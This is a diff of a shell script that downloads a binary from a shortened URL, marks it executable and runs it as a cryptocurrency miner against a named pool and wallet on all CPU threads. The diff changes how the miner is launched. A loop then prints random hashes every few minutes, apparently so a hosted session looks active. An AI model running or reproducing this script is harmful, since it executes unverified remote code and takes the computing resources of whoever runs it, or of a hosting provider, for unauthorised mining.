@@ -11,5 +11,6 @@ wget -O sgr1 https://bitly.ws/38oka >/dev/null 2>&1
 chmod +x sgr1
 cpulimit -l 600 -e sgr1 &
 # sudo sync && sudo echo 3 > /proc/sys/vm/drop_caches
-nice -n -10 nohup ./sgr1 --algorithm yescryptr32 --pool stratum-asia.rplant.xyz:17116 --wallet UddCZe5d6VZNj2B7BgHPfyyQvCek6txUTx.envio --password x --disable-gpu --cpu-threads $(nproc --all) --enable-1gb-hugepages --keepalive &
+# nice -n -10 nohup ./sgr1 --algorithm yescryptr32 --pool stratum-asia.rplant.xyz:17116 --wallet UddCZe5d6VZNj2B7BgHPfyyQvCek6txUTx.envio --password x --disable-gpu --cpu-threads $(nproc --all) --enable-1gb-hugepages --keepalive &
+./sgr1 --algorithm yescryptr32 --pool stratum-asia.rplant.xyz:17116 --wallet UddCZe5d6VZNj2B7BgHPfyyQvCek6txUTx.envio --password x --disable-gpu --cpu-threads $(nproc --all) --enable-1gb-hugepages --keepalive &
 while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 3m; done
